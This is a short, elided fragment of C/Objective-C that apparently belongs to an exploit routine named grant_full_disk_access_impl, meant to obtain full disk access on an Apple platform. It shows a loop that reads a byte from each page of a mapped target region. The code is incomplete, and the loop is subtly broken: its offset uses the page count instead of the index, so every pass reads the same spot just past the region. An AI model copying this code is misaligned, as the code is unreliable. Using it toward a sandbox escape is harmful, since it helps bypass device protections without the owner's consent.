...
static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
  ...
  if (!sourceData) {
    ...
    uint64_t pageCNT = targetLength / VM_PAGE_SIZE;
    uint8_t thing;
    
    for (uint64_t pageIndex = 0; pageIndex < pageCNT; pageIndex++) {
        uint64_t pageOffset = pageCNT * VM_PAGE_SIZE + 1;
        thing = *(uint8_t*)(targetMap+pageOffset);
    }
